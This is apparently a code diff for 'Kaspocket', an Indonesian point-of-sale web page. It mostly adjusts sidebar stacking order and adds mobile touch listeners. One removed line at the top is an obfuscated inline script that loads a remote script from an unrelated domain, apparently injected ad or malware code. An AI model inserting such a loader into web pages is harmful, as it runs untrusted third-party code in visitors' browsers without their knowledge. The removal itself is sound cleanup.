@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('vemtoutcheeg.com',9392007,document.createElement('script'))</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aplikasi Kasir Lengkap - Kaspocket</title>
-    <link rel="icon" type="image/png" href="https://content-fetcher.web.app/?id=uploaded:Desain tanpa judul (32).png-48698211-92e8-44c7-a51e-0cc6b19ec995">
+    <link rel="icon" type="image/png" href="https://content-fetcher.web.app/?id=uploaded:Desain tanpa judul (32).png-48698211-92e8-44c7-a51e-0cc6b1e9ec995">
 
     <meta name="google-site-verification" content="P3YGHZCaE9-ETe_ESuUs491p6Ytg0krlNd_wGW3KECo" />
     <meta name="description" content="Kaspocket adalah aplikasi kasir (Point of Sale) lengkap untuk manajemen produk, transaksi, dan laporan penjualan. Mudah digunakan dan responsif.">
@@ -203,6 +202,7 @@
         #sidebar {
             transform: translateX(-100%);
             transition: transform 0.3s ease-in-out;
+            z-index: 9998; /* Ensure sidebar is below toggle but above content */
         }
         #sidebar.open {
             transform: translateX(0);
@@ -218,11 +218,17 @@
                 display: none !important; /* Hide overlay on desktop */
             }
         }
+        #sidebar-toggle {
+            z-index: 9999; /* Ensure toggle button is always on top */
+        }
+        #sidebar-overlay {
+            z-index: 9997; /* Ensure overlay is below sidebar */
+        }
     </style>
 </head>
 <body class="bg-gray-100 text-gray-800">
     <div class="flex h-screen overflow-hidden">
-        <nav id="sidebar" class="w-64 bg-gray-800 text-gray-200 p-5 space-y-3 flex-shrink-0 overflow-y-auto fixed h-full z-50 lg:static">
+        <nav id="sidebar" class="w-64 bg-gray-800 text-gray-200 p-5 space-y-3 flex-shrink-0 overflow-y-auto fixed h-full lg:static">
             <h1 class="text-2xl font-bold text-white mb-6 text-center">Kaspocket</h1>
             <a data-view="kasir" class="nav-link active"><i class="fas fa-cash-register"></i>Kasir</a>
             <a data-view="manajemen-produk" class="nav-link"><i class="fas fa-box-open"></i>Manajemen Produk</a>
@@ -243,10 +249,10 @@
             </div>
         </nav>
 
-        <div id="sidebar-overlay" class="fixed inset-0 bg-black bg-opacity-50 z-40 hidden"></div>
+        <div id="sidebar-overlay" class="fixed inset-0 bg-black bg-opacity-50 hidden"></div>
 
         <main id="main-content" class="flex-1 p-4 sm:p-6 lg:p-8 overflow-y-auto">
-            <button id="sidebar-toggle" class="lg:hidden fixed top-4 left-4 z-50 p-2 rounded-md bg-indigo-600 text-white shadow-lg">
+            <button id="sidebar-toggle" class="lg:hidden fixed top-4 left-4 p-2 rounded-md bg-indigo-600 text-white shadow-lg">
                 <i class="fas fa-bars"></i>
             </button>
 
@@ -1767,12 +1773,16 @@
 
             // Sidebar toggle listeners
             if (sidebarToggle) {
+                // Add both click and touchstart for better compatibility
                 sidebarToggle.addEventListener('click', openSidebar);
+                sidebarToggle.addEventListener('touchstart', openSidebar); // For mobile webviews
             } else {
                 console.error("Element with ID 'sidebar-toggle' not found.");
             }
             if (sidebarOverlay) {
+                // Add both click and touchstart for better compatibility
                 sidebarOverlay.addEventListener('click', closeSidebar);
+                sidebarOverlay.addEventListener('touchstart', closeSidebar); // For mobile webviews
             } else {
                 console.error("Element with ID 'sidebar-overlay' not found.");
             }
